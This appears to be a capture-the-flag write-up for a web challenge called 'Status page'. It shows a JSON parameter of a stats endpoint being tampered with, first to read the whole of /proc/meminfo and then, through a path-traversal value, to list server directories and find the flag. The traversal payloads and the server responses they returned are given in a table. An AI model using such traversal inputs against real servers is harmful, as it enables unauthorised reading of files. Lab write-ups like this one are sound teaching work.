# Status page
10 Points

## Solution

We get a page titled "Find the flag on the server" which is displaying some usage stats:

```
MemTotal: 32891152 kB
MemFree: 5626532 kB
MemAvailable: 27921752 kB
```

It's possible to click a "refresh" button to refresh the stats. Clicking the button triggers a request to `refresh.ajax`. 

The request is:

```json
[{"l":3,"p":""}]
```

The response is of the form:

```json
{
  "result": [
    "MemTotal:       32891152 kB",
    "MemFree:         5633468 kB",
    "MemAvailable:   27945728 kB"
  ]
}
```

What if we change `l` to something other than `3`? We get:

```json
{
  "result": [
    "MemTotal:       32891152 kB",
    "MemFree:         9702228 kB",
    "MemAvailable:   28062364 kB",
    "Buffers:         1143108 kB",
    "Cached:          3573264 kB",
    "SwapCached:            0 kB",
    "Active:          6266240 kB",
    "Inactive:        4092732 kB",
    "Active(anon):    3037784 kB",
    "Inactive(anon):     6660 kB",
    "Active(file):    3228456 kB",
    "Inactive(file):  4086072 kB",
    "Unevictable:           0 kB",
    "Mlocked:               0 kB",
    "SwapTotal:             0 kB",
    "SwapFree:              0 kB",
    "Dirty:               564 kB",
    "Writeback:             0 kB",
    "AnonPages:       5640504 kB",
    "Mapped:           523372 kB",
    "Shmem:             12876 kB",
    "KReclaimable:   11512080 kB",
    "Slab:           12317368 kB",
    "SReclaimable:   11512080 kB",
    "SUnreclaim:       805288 kB",
    "KernelStack:       44640 kB",
    "PageTables:        61620 kB",
    "NFS_Unstable:          0 kB",
    "Bounce:                0 kB",
    "WritebackTmp:          0 kB",
    "CommitLimit:    16445576 kB",
    "Committed_AS:   27131012 kB",
    "VmallocTotal:   34359738367 kB",
    "VmallocUsed:       55848 kB",
    "VmallocChunk:          0 kB",
    "Percpu:           235136 kB",
    "AnonHugePages:    157696 kB",
    "ShmemHugePages:        0 kB",
    "ShmemPmdMapped:        0 kB",
    "FileHugePages:         0 kB",
    "FilePmdMapped:         0 kB",
    "HugePages_Total:       0",
    "HugePages_Free:        0",
    "HugePages_Rsvd:        0",
    "HugePages_Surp:        0",
    "Hugepagesize:       2048 kB",
    "Hugetlb:               0 kB",
    "DirectMap4k:     1768648 kB",
    "DirectMap2M:    31784960 kB",
    "DirectMap1G:     2097152 kB"
  ]
}
```

That looks like the result of `cat /proc/meminfo`. Can we perform directory traversal to cat a different file?

| What we send                        | What we get back                                                    |
| ----------------------------------- | ------------------------------------------------------------------- |
| `[{"l":150,"p":"./../version"}]`    | `Linux version 5.4.89+ (builder@000b7ffa02b3) (Chromium OS 11.0_pre391452_p20200527-r7 clang version 11.0.0 (/var/cache/chromeos-cache/distfiles/host/egit-src/llvm-project a8e5dcb072b1f794883ae8125fb08c06db678d56)) #1 SMP Sat Feb 13 19:45:14 PST 2021"` |
| `[{"l":150,"p":"./../self/cwd"}]`   | `{"result":["cloud-grid-runner.js","config","create-app.js","factories.js","g","jest.config.js","jest.e2e.config.js","jest.fakes.config.js","jest.it.config.js","jest.it.data.config.js","jest.it.parallel.config.js","node_modules","package-lock.json","package.json","src"]}` |
| `[{"l":150,"p":"./../self/src"}]`   | `{"result":["bi-logging","config","handlers","init","js-server-side","libs","middleware","npm-support","preload","runtime-env","tracing.js","uncaught-exception-handler.js"]}` |
| `[{"l":150,"p":"./../self/cwd/src/../../../../"}]` | `{"result":["etc","lib","lib64","node","proc","sys","user-code","usr"]}` |
| `[{"l":150,"p":"./../self/cwd/src/../../../../user-code"}]` | `{"result":["d1r3c70rY_7R4v3R54L","public"]}` |



